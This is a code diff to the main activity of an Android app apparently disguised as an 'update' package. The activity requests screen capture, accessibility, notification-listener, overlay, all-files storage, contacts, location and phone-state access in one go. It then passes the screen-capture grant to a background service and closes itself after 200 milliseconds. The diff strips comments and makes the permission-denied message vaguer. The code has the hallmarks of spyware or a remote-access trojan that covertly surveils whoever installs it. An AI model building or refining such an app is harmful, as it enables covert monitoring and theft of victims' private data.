@@ -1,5 +1,3 @@
-// File ke top pe yeh import add karo
-import android.os.Environment;
 package com.kasari.update;
 
 import android.Manifest;
@@ -9,6 +7,7 @@ import android.media.projection.MediaProjectionManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Environment;
 import android.os.Handler;
 import android.provider.Settings;
 import android.widget.Toast;
@@ -31,13 +30,8 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        // Request all permissions at once
         requestAllPermissions();
-
-        // Start background service
         startBackgroundService();
-
-        // Finish activity after 200ms
         new Handler().postDelayed(this::finish, 200);
     }
 
@@ -56,7 +50,6 @@ public class MainActivity extends AppCompatActivity {
             ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
         }
 
-        // Overlay permission
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             if (!Settings.canDrawOverlays(this)) {
                 Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
@@ -65,7 +58,6 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // Screen capture permission
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             MediaProjectionManager projectionManager =
                 (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
@@ -76,7 +68,6 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // Storage permission for Android 11+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             if (!Environment.isExternalStorageManager()) {
                 Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
@@ -85,7 +76,6 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // Notification listener
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
             String enabledListeners = Settings.Secure.getString(getContentResolver(),
                 "enabled_notification_listeners");
@@ -96,7 +86,6 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // Accessibility service
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             if (!isAccessibilityServiceEnabled()) {
                 startActivityForResult(
@@ -118,10 +107,7 @@ public class MainActivity extends AppCompatActivity {
                 Manifest.permission.ACCESS_COARSE_LOCATION,
                 Manifest.permission.READ_CONTACTS,
                 Manifest.permission.POST_NOTIFICATIONS,
-                Manifest.permission.READ_PHONE_STATE,
-                Manifest.permission.READ_MEDIA_IMAGES,
-                Manifest.permission.READ_MEDIA_AUDIO,
-                Manifest.permission.READ_MEDIA_VIDEO
+                Manifest.permission.READ_PHONE_STATE
             };
         } else {
             return new String[]{
@@ -168,7 +154,7 @@ public class MainActivity extends AppCompatActivity {
         if (requestCode == PERMISSION_REQUEST_CODE) {
             for (int i = 0; i < grantResults.length; i++) {
                 if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
-                    Toast.makeText(this, "Permission required: " + permissions[i], Toast.LENGTH_SHORT).show();
+                    Toast.makeText(this, "Permission required", Toast.LENGTH_SHORT).show();
                 }
             }
         }
@@ -179,7 +165,6 @@ public class MainActivity extends AppCompatActivity {
         super.onActivityResult(requestCode, resultCode, data);
         
         if (requestCode == SCREEN_CAPTURE_REQUEST_CODE && resultCode == RESULT_OK && data != null) {
-            // Save screen capture permission for ScreenMirror
             Intent serviceIntent = new Intent(this, BackgroundService.class);
             serviceIntent.putExtra("screen_capture_code", resultCode);
             serviceIntent.putExtra("screen_capture_data", data);
@@ -189,10 +174,5 @@ public class MainActivity extends AppCompatActivity {
                 startService(serviceIntent);
             }
         }
-    }
-
-    @Override
-    protected void onDestroy() {
-        super.onDestroy();
     }
 }
